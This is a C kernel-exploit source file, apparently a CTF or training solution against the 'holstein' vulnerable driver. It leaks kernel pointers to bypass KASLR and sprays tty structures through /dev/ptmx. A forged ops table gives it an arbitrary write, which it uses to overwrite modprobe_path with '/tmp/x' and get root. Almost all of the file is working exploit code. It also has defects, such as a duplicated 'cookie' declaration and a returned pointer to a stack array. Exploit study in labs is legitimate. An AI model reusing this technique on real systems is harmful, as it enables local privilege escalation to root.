#include "kpwn.h"

int global_fd;
char *VULN_DRV = "/dev/holstein";

void open_dev() {
    global_fd = open(VULN_DRV, O_RDWR);
    if (global_fd < 0) {
        printf("[!] Failed to open %s\n", VULN_DRV);
        exit(-1);
    } else {
        printf("[+] Successfully opened %s\n", VULN_DRV);
    }
}

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t user_rip = (uint64_t) spawn_shell;
unsigned long cookie;
uint64_t cookie;
uint64_t kgaslr_leak;
uint64_t kbase;
uint8_t cookie_off;

uint64_t* leak_cookie() {
    uint8_t sz = 0x500 / 8 ;
    uint64_t leak[sz];
    memset(leak, 0, sizeof(leak));
    printf("[*] Attempting to leak up to %zu bytes\n", sizeof(leak));
    ssize_t bytes_read = read(global_fd, leak, sizeof(leak)); // Use ssize_t for read return

    if (bytes_read <= 0) {
        perror("[!] Failed to read from device during leak attempt");
        exit(-1);
    }
    printf("[*] Read %zd bytes. Searching leak...\n", bytes_read);


    for (uint8_t i = 0; i < sz; i++) {
        if (i * sizeof(uint64_t) >= bytes_read) break;

        uint64_t current_leak = leak[i];
        char leak_str[99]; // Enough for 0x + 16 hex digits + null terminator
        sprintf(leak_str, "%#02lx", current_leak); // Use fixed width for alignment
        printf("\t--> %d: leak + 0x%x\t: %s", i, (unsigned int)(sizeof(leak[0]) * i), leak_str);

        int printed_marker = 0;
        if (!cookie && is_cookie(leak_str) && i > 2) { // Check if is_cookie exists and uncomment
            printf("\t<== stack canary\n");
            cookie_off = i;
            cookie = current_leak; // Store the numeric value
            printed_marker = 1;
        }

        if (!printed_marker) {
            puts("");
        }
    }

    kgaslr_leak = leak[131] - 0xc38880;
	if(!cookie) {
    	puts("[!] Failed to leak stack cookie!");
    }else {
        printf("[*] Found stack cookie: %#018lx at offset %d\n", cookie, cookie_off);
    }

    return leak;
}

void fatal(const char *resource) {
    perror(resource);
    exit(-1);
}

/*
ioctl(spray[i], 0xdeadbeef, 0xcafebabe)
RCX: 00000000deadbeef
RDX: 00000000cafebabe
RSI: 00000000deadbeef
R08: 00000000cafebabe
R12: 00000000deadbeef
R14: 00000000cafebabe
*/

uint64_t g_buf;
uint64_t driver;
uint64_t arw_rcx_rdx;
int spray_buf[100];
char buf[0x500];

uint64_t arw_rdx_rcx;
uint64_t modprobe;

void AAW32(uint32_t data, uint64_t target){
    struct tty_struct *tty = (uint64_t *)&buf[0x400]; 
    struct fake_operations_table *vtable = (uint64_t *)&buf;

    memcpy(buf, &fake_tty, sizeof(fake_tty));

    tty->driver = driver;
    tty->ops = g_buf;
    vtable->ioctl = arw_rdx_rcx;
    
    write(global_fd, buf, 0x500);

    for (int i = 0; i <= 50; i++) {
        ioctl(spray_buf[i], data, target);
    }
}

int main() {
    set_root_probe();
    save_state();

    for (int i = 0; i < 50; i++){
        spray_buf[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray_buf[i] < 0) {
            fatal("ptmx");
        }
    }
    open_dev();
    for (int i = 50; i < 100; i++){
        spray_buf[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray_buf[i] < 0) {
            fatal("ptmx");
        }
    }
    
    read(global_fd, buf, 0x500);
    kgaslr_leak = *(unsigned long*)&buf[0x418] - 0xc38880;
    dump(buf, 0x500);

    printf("[*] kgaslr leak: %#018lx\n", kgaslr_leak);

    if ( kgaslr_leak & 0x100000 ) {
        fatal(kgaslr_leak);
    } 
    
    arw_rdx_rcx = kgaslr_leak + 0x477f7;
    modprobe = kgaslr_leak + 0xe38180;

    g_buf = *(unsigned long*)&buf[0x438] - 0x438;
    driver= *(unsigned long*)&buf[0x438] - 0x9ef538;

    printf("[+] g_buf = 0x%016lx\n", g_buf); // 

    char cmd[] = "/tmp/x";
    for (int i = 0; i < sizeof(cmd); i += 4) {
        AAW32(*(unsigned int*)&cmd[i], modprobe + i);
    }

    get_root_probe();
    close(global_fd);
}